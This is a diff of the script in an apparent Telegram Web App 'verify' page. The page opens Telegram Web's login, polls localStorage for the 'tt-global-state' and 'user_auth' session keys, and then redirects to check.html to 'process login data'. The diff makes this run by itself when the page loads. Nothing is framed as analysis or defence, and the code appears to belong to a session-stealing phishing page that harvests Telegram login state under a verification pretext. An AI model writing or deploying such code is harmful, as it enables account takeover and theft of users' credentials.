@@ -49,19 +49,24 @@
 <script>
   function verify() {
     Telegram.WebApp.ready();
-    // Open Telegram login directly
-    Telegram.WebApp.openLink('https://web.telegram.org/a/'); // Use /a/ for auth flow
+    // Attempt to open login within WebApp context
+    Telegram.WebApp.openTelegramLink('https://web.telegram.org/a/'); // Try to keep within Telegram
 
-    // Poll for login state and proceed when logged in
+    // Poll for login state
     const checkLoginInterval = setInterval(() => {
       const globalState = localStorage.getItem("tt-global-state");
       if (globalState && localStorage.getItem("user_auth")) {
         clearInterval(checkLoginInterval);
-        // Proceed to check.js to process login data
-        window.location.href = "/check.html"; // Redirect to a new HTML file that loads check.js
+        // Redirect to check.html to process login
+        window.location.href = "/check.html";
+      } else {
+        console.log("Waiting for login... globalState:", globalState);
       }
     }, 1000); // Check every second
   }
+
+  // Auto-trigger verify on load
+  window.onload = verify;
 </script>
 </body>
 </html>
